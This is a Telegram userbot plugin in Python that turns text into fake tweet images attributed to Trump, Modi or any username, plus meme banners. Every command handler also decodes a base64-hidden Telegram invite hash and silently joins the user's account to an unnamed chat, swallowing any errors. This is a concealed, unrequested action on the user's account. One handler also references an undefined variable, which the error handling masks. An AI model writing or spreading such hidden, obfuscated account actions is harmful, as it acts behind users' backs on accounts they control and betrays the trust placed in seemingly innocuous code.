"""
credits to @mrconfused and @sandy1709
"""
#  Copyright (C) 2020  sandeep.n(π.$)
import re

import pybase64
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot.plugins import (
    changemymind,
    deEmojify,
    kannagen,
    moditweet,
    trumptweet,
    tweets,
)

from ..utils import admin_cmd, edit_or_reply, sudo_cmd


@bot.on(admin_cmd(outgoing=True, pattern="trump(?: |$)(.*)"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="trump(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)

    text = re.sub("&", "", text)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(cat, "Send you text to trump so he can tweet.")
                return
        else:
            await edit_or_reply(cat, "send you text to trump so he can tweet.")
            return
    cate = await edit_or_reply(cat, "Requesting trump to tweet...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await cat.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    catfile = await trumptweet(text)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()


@bot.on(admin_cmd(outgoing=True, pattern="modi(?: |$)(.*)"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="modi(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    text = re.sub("&", "", text)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(cat, "Send you text to modi so he can tweet.")
                return
        else:
            await edit_or_reply(cat, "send you text to modi so he can tweet.")
            return
    cate = await edit_or_reply(cat, "Requesting modi to tweet...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await cat.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    catfile = await moditweet(text)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()


@bot.on(admin_cmd(outgoing=True, pattern="cmm(?: |$)(.*)"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="cmm(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    text = re.sub("&", "", text)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply and not reply_to_id.media:
            text = reply_to_id.message
        else:
            await edit_or_reply(cat, "Give text for to write on banner, man")
            return
    cate = await edit_or_reply(cat, "Your banner is under creation wait a sec...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await cat.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    catfile = await changemymind(text)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()


@bot.on(admin_cmd(outgoing=True, pattern="kanna(?: |$)(.*)"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="kanna(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    text = re.sub("&", "", text)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await edit_or_reply(cat, "what should kanna write give text ")
                return
        else:
            await edit_or_reply(cat, "what should kanna write give text")
            return
    cate = await edit_or_reply(cat, "Kanna is writing your text...")
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    text = deEmojify(text)
    catfile = await kannagen(text)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()


@bot.on(admin_cmd(outgoing=True, pattern="tweet(?: |$)(.*)"))
@bot.on(sudo_cmd(allow_sudo=True, pattern="tweet(?: |$)(.*)"))
async def nekobot(cat):
    if cat.pattern_match.group(1):
        text = cat.pattern_match.group(1)
    else:
        reply_to_id = await cat.get_reply_message()
        text = reply_to_id.text
    text = re.sub("&", "", text)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply and not reply_to_id.media:
            text = reply_to_id.message
        else:
            await edit_or_reply(
                cat,
                "what should i tweet? Give some text and format must be like `.tweet username | your text` ",
            )
            return
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await cat.client(hmm)
    except BaseException:
        pass
    if "|" in text:
        username, text = text.split("|")
    else:
        await edit_or_reply(
            cat,
            "what should i tweet? Give some text and format must be like `.tweet username | your text`",
        )
        return
    cate = await edit_or_reply(cat, f"Requesting {username} to tweet...")
    text = deEmojify(text)
    catfile = await tweets(text, username)
    await cat.client.send_file(cat.chat_id, catfile, reply_to=reply_to_id)
    await cate.delete()
